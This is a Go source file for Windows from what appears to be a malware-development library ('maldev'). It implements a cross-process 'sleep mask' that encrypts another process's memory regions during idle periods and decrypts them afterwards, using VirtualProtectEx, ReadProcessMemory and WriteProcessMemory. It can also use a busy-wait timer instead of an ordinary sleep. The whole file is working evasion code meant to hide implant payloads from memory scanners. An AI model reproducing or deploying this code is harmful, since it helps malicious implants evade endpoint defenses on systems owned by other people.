//go:build windows

package sleepmask

import (
	"context"
	"fmt"
	"time"

	"golang.org/x/sys/windows"

	"github.com/oioio-space/maldev/recon/timing"
)

// RemoteInlineStrategy is the L1 cross-process strategy: the caller
// goroutine drives the full encrypt → wait → decrypt cycle using
// VirtualProtectEx + ReadProcessMemory + WriteProcessMemory. The
// cipher runs on a local buffer (ReadProcessMemory → Apply →
// WriteProcessMemory).
type RemoteInlineStrategy struct {
	UseBusyTrig bool
}

func (s *RemoteInlineStrategy) Cycle(ctx context.Context, regions []RemoteRegion, cipher Cipher, key []byte, d time.Duration) error {
	origProtect := make([]uint32, len(regions))

	for i, r := range regions {
		h := windows.Handle(r.Handle)
		if err := windows.VirtualProtectEx(h, r.Addr, r.Size, windows.PAGE_READWRITE, &origProtect[i]); err != nil {
			return fmt.Errorf("sleepmask/remote-inline: encrypt VirtualProtectEx: %w", err)
		}
		buf := make([]byte, r.Size)
		var n uintptr
		if err := windows.ReadProcessMemory(h, r.Addr, &buf[0], r.Size, &n); err != nil {
			return fmt.Errorf("sleepmask/remote-inline: encrypt ReadProcessMemory: %w", err)
		}
		cipher.Apply(buf, key)
		if err := windows.WriteProcessMemory(h, r.Addr, &buf[0], r.Size, &n); err != nil {
			return fmt.Errorf("sleepmask/remote-inline: encrypt WriteProcessMemory: %w", err)
		}
	}

	waitErr := s.wait(ctx, d)

	// Decrypt (always).
	for i, r := range regions {
		h := windows.Handle(r.Handle)
		var tmp uint32
		windows.VirtualProtectEx(h, r.Addr, r.Size, windows.PAGE_READWRITE, &tmp)
		buf := make([]byte, r.Size)
		var n uintptr
		windows.ReadProcessMemory(h, r.Addr, &buf[0], r.Size, &n)
		cipher.Apply(buf, key)
		windows.WriteProcessMemory(h, r.Addr, &buf[0], r.Size, &n)
		windows.VirtualProtectEx(h, r.Addr, r.Size, origProtect[i], &tmp)
	}

	return waitErr
}

func (s *RemoteInlineStrategy) wait(ctx context.Context, d time.Duration) error {
	if s.UseBusyTrig {
		done := make(chan struct{})
		go func() { timing.BusyWaitTrig(d); close(done) }()
		select {
		case <-done:
			return nil
		case <-ctx.Done():
			return ctx.Err()
		}
	}
	t := time.NewTimer(d)
	defer t.Stop()
	select {
	case <-t.C:
		return nil
	case <-ctx.Done():
		return ctx.Err()
	}
}
